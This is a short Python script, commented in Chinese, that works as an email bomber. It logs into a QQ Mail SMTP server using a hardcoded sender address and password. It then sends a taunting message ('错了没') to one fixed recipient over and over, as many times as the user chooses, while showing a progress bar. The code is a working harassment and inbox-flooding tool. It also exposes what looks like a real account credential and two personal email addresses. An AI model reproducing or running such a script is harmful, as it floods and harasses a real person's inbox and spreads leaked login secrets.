#-------------------------------------------------------------------------------
# Name:        模块1
# Purpose:
#
# Author:      王久铭
#
# Created:     17/07/2019
# Copyright:   (c) 王久铭 2019
# Licence:     <your licence>
#-------------------------------------------------------------------------------
#发邮件的库
import sys
import smtplib
import time
ecoding="utf-8"
#输入轰炸邮件数目
k=int(input())
scale=k-1
#scale=int(input())
i=0
#邮件文本
from email.mime.text import MIMEText
#SMTP服务器
SMTPServer = "smtp.qq.com"
#发邮件的地址
sender = "2115655391@qq.com"
#发送者邮箱的密码
passwd = "obsdfcqvqznbcecg"
#设置发送的内容
message = "错了没"
#转换成邮件文本
msg = MIMEText(message)
#标题
msg["Subject"] = "snake"
#发送者
msg["From"] = sender
#创建SMTP服务器
mailServer = smtplib.SMTP(SMTPServer, 25)
#登陆邮箱
mailServer.login(sender, passwd)
#发送邮件
print("执行开始".center(scale // 2,"-"))
while i<=scale :
    start = time.perf_counter()
    a = "*" * i
    b = "." * (scale - i)
    c = (i / scale) * 100
    dur = time.perf_counter() - start
    print("\r{:^3.0f}%[{}->{}]{:.2f}s".format(c,a,b,dur),end = "")
    time.sleep(1)
#发送邮件部分
    mailServer.sendmail(sender, ["1929889858@qq.com"], msg.as_string())
    time.sleep(1)
    i=i+1
#退出邮箱
print("\n"+"执行结束".center(scale // 2,"-"))
mailServer.quit()

